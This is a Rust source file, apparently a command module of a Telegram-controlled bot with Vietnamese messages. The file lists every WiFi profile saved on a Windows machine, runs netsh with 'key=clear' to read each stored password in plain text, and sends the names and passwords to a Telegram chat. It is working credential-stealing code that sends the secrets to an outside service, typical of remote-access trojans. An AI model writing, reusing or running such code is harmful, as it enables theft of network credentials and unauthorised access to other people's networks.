use anyhow::Result;
use teloxide::prelude::*;
use teloxide::types::{ChatId, MessageId};
use tokio::process::Command;

use crate::bot::md;

/// Parse WiFi profile name from a netsh output line like "All User Profile : MyWiFi".
fn parse_profile_name(line: &str) -> Option<String> {
    let (key, value) = line.split_once(':')?;
    let key = key.trim();
    if key == "All User Profile" || key == "User profile" {
        Some(value.trim().to_string())
    } else {
        None
    }
}

/// Get the saved password for a WiFi profile via netsh.
async fn get_wifi_password(profile: &str) -> String {
    let out = Command::new("netsh")
        .args(["wlan", "show", "profile", profile, "key=clear"])
        .output()
        .await;

    match out {
        Ok(o) => String::from_utf8_lossy(&o.stdout)
            .lines()
            .find(|l| l.contains("Key Content"))
            .and_then(|l| l.split_once(':'))
            .map(|(_, v)| v.trim().to_string())
            .unwrap_or_default(),
        Err(_) => String::new(),
    }
}

pub async fn wifi(bot: &Bot, chat_id: ChatId, reply_to: MessageId) -> Result<()> {
    let output = Command::new("netsh")
        .args(["wlan", "show", "profiles"])
        .output()
        .await?;

    let stdout = String::from_utf8_lossy(&output.stdout);
    let profiles: Vec<String> = stdout.lines().filter_map(parse_profile_name).collect();

    if profiles.is_empty() {
        return md::send(
            bot,
            chat_id,
            reply_to,
            "ℹ️ Không tìm thấy WiFi đã lưu".to_string(),
        )
        .await;
    }

    let mut result = String::from("*📶 WiFi đã lưu:*\n\n");

    for profile in &profiles {
        let password = get_wifi_password(profile).await;
        if password.is_empty() {
            result.push_str(&format!(
                "{} \\- _không có mật khẩu_\n",
                md::escape(profile)
            ));
        } else {
            result.push_str(&format!(
                "{} \\- {}\n",
                md::escape(profile),
                md::escape(&password)
            ));
        }
    }

    md::send(bot, chat_id, reply_to, result).await
}
